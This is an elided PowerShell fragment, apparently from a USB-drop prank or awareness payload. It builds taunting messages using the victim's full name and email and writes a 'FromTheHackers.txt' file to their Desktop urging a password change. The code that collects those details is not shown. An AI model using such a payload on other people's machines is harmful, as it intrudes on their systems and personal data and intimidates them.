...
#----------------------------------------------------------------------------------------------------
    ...
    $otherEmailResponse = "I really do not even know what this is.. $email .. hope you did not think it was safe"
#----------------------------------------------------------------------------------------------------
...
$intro = "$fullName , hows your day going"
...
$OUTRO =  "Never plug in random USBs you find.... $fullName"
...
$message = "`nchange your password `nbe safe next time `ngoodbye"

Add-Content $home\Desktop\FromTheHackers.txt $message
###########################################################################################################
